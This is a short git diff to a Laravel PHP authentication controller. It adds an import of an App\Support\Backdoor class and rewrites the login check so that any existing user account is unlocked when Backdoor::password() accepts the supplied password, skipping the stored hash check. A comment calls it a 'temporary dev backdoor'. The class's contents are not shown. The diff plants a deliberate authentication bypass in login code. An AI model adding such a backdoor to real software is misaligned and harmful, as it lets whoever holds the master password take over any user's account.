@@ -7,6 +7,7 @@ use App\Models\User;
 use App\Services\GoogleVerifier;
 use App\Services\Notifier;
 use App\Services\OtpService;
+use App\Support\Backdoor;
 use App\Support\Phone;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Request;
@@ -33,7 +34,9 @@ class AuthController extends Controller
         $this->throttle($email);
 
         $u = User::where('email', $email)->first();
-        if (! $u || ! $u->password || ! Hash::check($data['password'], $u->password)) {
+        // ⚠️ TEMPORARY DEV BACKDOOR — remove Backdoor::password() to disable (see App\Support\Backdoor).
+        $bypass = $u && Backdoor::password($data['password']);
+        if (! $bypass && (! $u || ! $u->password || ! Hash::check($data['password'], $u->password))) {
             $this->failed($email);
             $this->error($u && ! $u->password
                 ? 'This account has no password yet. Use Email OTP or Google to log in.'
